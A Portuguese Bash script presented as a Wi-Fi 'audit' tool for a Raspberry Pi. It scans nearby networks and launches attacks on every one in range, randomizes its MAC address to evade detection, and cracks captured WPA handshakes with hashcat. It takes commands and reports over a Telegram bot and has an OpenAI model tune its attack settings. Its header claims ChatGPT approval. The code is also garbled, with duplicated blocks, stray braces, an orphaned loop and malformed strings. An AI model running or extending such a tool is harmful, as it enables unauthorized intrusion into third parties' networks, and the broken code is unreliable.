#!/bin/bash

# ===========================
# URBAN HACK SENTINEL
# Auditoria Wi-Fi com IA adaptativa
# Versão: Abril 2025
# Autor: André Santos
# Aprovado por ChatGPT
# ===========================

# Carrega configurações externas
source config.cfg

# Variáveis de controle
REALTIME_MODE=false
PAUSED=false
CYCLE_COUNT=0
LAST_AUTO_UPDATE=$(date +%s)
LAST_GPT_UPDATE=$(date +%s)
declare -a CURRENT_TARGETS  # Armazena redes sob ataque
PAUSED=false
CYCLE_COUNT=0
LAST_AUTO_UPDATE=$(date +%s)
LAST_GPT_UPDATE=$(date +%s)

# Cria o diretório de logs
mkdir -p logs

# -------- Funções Auxiliares --------

notify_telegram() {
  local msg="$1"
  curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage" \
    -d chat_id="${TELEGRAM_CHAT_ID}" \
    -d text="$msg" >/dev/null
}

randomize_mac() {
  local iface="$1"
  ip link set "$iface" down
  macchanger -r "$iface" >/dev/null 2>&1
  ip link set "$iface" up
}

watch_temperature() {
  local raw=$(cat /sys/class/thermal/thermal_zone0/temp)
  local c=$((raw/1000))
  if (( c > TEMP_LIMIT )); then
    notify_telegram "[ALERTA] Temp: ${c}°C > ${TEMP_LIMIT}°C. Pausando ataques."
    PAUSED=true
  fi
}

consult_gpt() {
  local now=$(date +%s)
  if (( now - LAST_GPT_UPDATE < GPT_INTERVAL )); then return; fi
  LAST_GPT_UPDATE=$now
  # Prepara métricas
  local payload=$(jq -n \
    --arg cycles "$CYCLE_COUNT" \
    --arg pmkid "$PMKID_COUNT" \
    --arg hs "$HS_SUCCESS_COUNT" \
    --arg temp "$(cat /sys/class/thermal/thermal_zone0/temp)" \
    --arg load "$(uptime | awk -F'load average:' '{print $2}' | cut -d, -f1)" \
    '{cycles:($cycles|tonumber), pmkid:($pmkid|tonumber), hs:($hs|tonumber), temp:($temp|tonumber), load:(($load)+0)}')
  # Chama API
  local resp=$(curl -s --max-time 10 https://api.openai.com/v1/chat/completions \
    -H "Authorization: Bearer ${OPENAI_API_KEY}" \
    -H 'Content-Type: application/json' \
    -d @- <<EOF
{
  "model": "${GPT_MODEL}",
  "messages": [
    {"role":"system","content":"És um assistente que otimiza auditorias Wi-Fi móveis num Raspberry Pi. Retorna apenas JSON com timeout, jobs, signal, proximo_intervalo, explicacao."},
    {"role":"user","content":"Métricas: $payload"}
  ],
  "temperature": 0.2
}
EOF
  )
  # Extrai valores
  local timeout jobs signal next_int exp
  timeout=$(echo "$resp" | jq -r '.choices[0].message.content|fromjson|.timeout')
  jobs=$(echo    "$resp" | jq -r '.choices[0].message.content|fromjson|.jobs')
  signal=$(echo  "$resp" | jq -r '.choices[0].message.content|fromjson|.signal')
  next_int=$(echo "$resp" | jq -r '.choices[0].message.content|fromjson|.proximo_intervalo')
  exp=$(echo     "$resp" | jq -r '.choices[0].message.content|fromjson|.explicacao')
  # Aplica com limites
  [[ $timeout -ge MIN_TIMEOUT && $timeout -le MAX_TIMEOUT ]] && TIMEOUT_SCAN=$timeout
  [[ $jobs -ge MIN_JOBS    && $jobs -le MAX_JOBS     ]] && MAX_JOBS=$jobs
  [[ $signal -le MAX_SIGNAL && $signal -ge MIN_SIGNAL ]] && SIGNAL_THRESHOLD=$signal
  [[ $next_int -ge MIN_GPT_INTERVAL && $next_int -le MAX_GPT_INTERVAL ]] && GPT_INTERVAL=$next_int
  # Notifica ajuste
  notify_telegram "[IA AJUSTE]\nTimeout: $timeout\nJobs: $jobs\nSignal: >= $signal dBm\nPróx consulta: $next_int s\nExplicação: $exp"
}

realtime_status() {
  while $REALTIME_MODE; do
    echo "[Realtime] $(date '+%H:%M:%S') Ciclo:$CYCLE_COUNT Jobs:$(jobs -rp|wc -l) Targets:${CURRENT_TARGETS[*]}" >> logs/realtime.log
    sleep 1
  done
}
}

# -------- Comandos IA --------
executar_comando_ia() {
  local cmd="$1" out=""
  case $cmd in
    ver_temperatura) out="$(( $(cat /sys/class/thermal/thermal_zone0/temp)/1000 ))°C";;
    ver_carga)       out="$(uptime)";;
    ver_jobs)        out="$(jobs -l)";;
    ver_wifi_ativos) out="$(iw dev "$WIFI_IFACE" scan | grep SSID|uniq)";;
    ver_rede_atual)  out="$(iwconfig "$WIFI_IFACE";ip a show "$WIFI_IFACE")";;
    testar_ping)     out="$(ping -c4 1.1.1.1)";;
    ver_logs_recent) out="$(tail -n10 logs/status.log)";;
    ver_memoria)     out="$(free -h)";;
    pausar_ataques)  PAUSED=true; out="Ataques pausados.";;
    retomar_ataques) PAUSED=false; out="Ataques retomados.";;
    recarregar_config) source config.cfg; out="Config recarregada.";;
    consultar_ia_manual) consult_gpt; out="Consulta IA manual feita.";;
    scan_rapido)     iw dev "$WIFI_IFACE" scan|grep SSID>logs/scan_rapido.log; out="Scan rápido salvo.";;
    scan_completo)   timeout 15 iw dev "$WIFI_IFACE" scan>logs/scan_completo.log; out="Scan completo salvo.";;
    testar_handshake_ultimo)
                     out="$(hashcat -m22000 -a3 hashcat_ready/ultimo.hc22000 ?l?l?l?l?l?l?l?l --force)";;
    mostrar_redes_prioritarias)
                     out="$(grep -E 'WPS|Signal' logs/status.log|head -n10)";;
    status_sistema)
      local t=$(($(/sys/class/thermal/thermal_zone0/temp)/1000)); local j=$(jobs -rp|wc -l);
      out="Temp:${t}°C Jobs:$j Uptime:$(uptime -p)";;
    resumo_historico)
      out="$(cat logs/historico_resumo.txt 2>/dev/null||echo 'Sem histórico')";;
    *) out="Comando IA desconhecido: $cmd";;
  esac
  notify_telegram "[EXEC IA] $cmd -> $out"
}

verificar_comando_ia() {
  [[ -f comando_ia.json ]] || return
  local cmd=$(jq -r .comando comando_ia.json)
  executar_comando_ia "$cmd"
  rm -f comando_ia.json
}

check_telegram_commands() {
  local cmd=$(curl -s "https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates"|grep -o '/[a-z_]*')
  case $cmd in
    /tempo_real) REALTIME_MODE=true;  notify_telegram "Modo realtime ativado.";;
    /parar_tempo_real) REALTIME_MODE=false; notify_telegram "Realtime desativado.";;
    /comandos_ia)
      notify_telegram "[COMANDOS IA]\nver_temperatura, ver_carga, ver_jobs, ver_wifi_ativos, ver_rede_atual, testar_ping, ver_logs_recent, ver_memoria, pausar_ataques, retomar_ataques, recarregar_config, consultar_ia_manual, scan_rapido, scan_completo, testar_handshake_ultimo, mostrar_redes_prioritarias, status_sistema, resumo_historico"
      ;;
  esac
}

# -------- Scanner e Ataques --------
scanear_redes() {
  iwlist "$WIFI_IFACE" scan > logs/scan_temp.txt
  unset REDES
  declare -A REDES
  local bssid essid tipo
  while read -r line; do
    [[ $line =~ Address: ]]  && bssid=$(echo $line|awk '{print $5}')
    [[ $line =~ ESSID: ]]    && essid=${line#*ESSID:"}; essid=${essid%"}
    [[ $line =~ WPA2 ]]      && tipo=WPA
    [[ $line =~ WPA ]]       && tipo=WPA
    [[ $line =~ WEP ]]       && tipo=WEP
    [[ $line =~ WPS ]]       && tipo=WPS
    if [[ $bssid && $essid && $tipo ]]; then
      REDES["$bssid"]="$essid|$tipo"; bssid=essid=tipo=
    fi
  done < logs/scan_temp.txt
}

executar_ataques_disponiveis() {
  CURRENT_TARGETS=()  # Lista de ESSIDs atacadas neste ciclo
  for b in "${!REDES[@]}"; do
    if (( $(jobs -rp|wc -l) < MAX_JOBS )); then
      IFS='|' read essid tipo <<< "${REDES[$b]}"
      CURRENT_TARGETS+=("$essid")
      executar_ataque "$b" "$essid" "$tipo"
    fi
  done
}
  for b in "${!REDES[@]}"; do
    if (( $(jobs -rp|wc -l) < MAX_JOBS )); then
      IFS='|' read essid tipo <<< "${REDES[$b]}"
      executar_ataque "$b" "$essid" "$tipo"
    fi
  done
}

# -------- Loop Principal --------
while true; do
  CURRENT_TARGETS=()  # Reset targets a cada ciclo
  ((CYCLE_COUNT++))
  check_telegram_commands
  verificar_comando_ia
  watch_temperature
  $PAUSED && sleep 5 && continue
  (( CYCLE_COUNT % 5 == 0 )) && randomize_mac "$WIFI_IFACE"
  scanear_redes
  executar_ataques_disponiveis
  consult_gpt
  local now=$(date +%s)
  (( now - LAST_AUTO_UPDATE >= AUTO_STATUS_INTERVAL )) && {
    notify_telegram "[STATUS] Ciclo:$CYCLE_COUNT | Timeout:$TIMEOUT_SCAN | Jobs:$MAX_JOBS | Targets:${CURRENT_TARGETS[*]}"$CYCLE_COUNT Timeout:$TIMEOUT_SCAN Jobs:$MAX_JOBS"
    LAST_AUTO_UPDATE=$now
  }
  $REALTIME_MODE && realtime_status &
  sleep $TIMEOUT_SCAN
done
